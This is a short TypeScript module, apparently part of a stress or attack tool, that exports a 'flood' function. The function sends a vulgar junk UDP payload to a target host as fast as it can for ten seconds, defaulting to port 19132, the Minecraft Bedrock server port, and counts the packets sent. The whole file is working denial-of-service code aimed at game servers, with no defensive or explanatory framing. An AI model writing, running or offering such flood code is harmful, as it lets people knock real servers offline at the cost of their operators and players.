import * as dgram from "dgram"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 19132,
  }
}

const MCPE_PAYLOAD = Buffer.from("atom data ontop my own ass amp/triphent is my dick and balls", "utf-8")

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)

  return new Promise((resolve) => {
    const sock = dgram.createSocket("udp4")
    const send = () => {
      try {
        sock.send(MCPE_PAYLOAD, port, host, () => {
          onStats(1, MCPE_PAYLOAD.length)
          setImmediate(send)
        })
      } catch {
        sock.close()
        resolve()
      }
    }
    sock.on("error", () => resolve())
    send()
    setTimeout(() => {
      sock.close()
      resolve()
    }, 10000)
  })
}
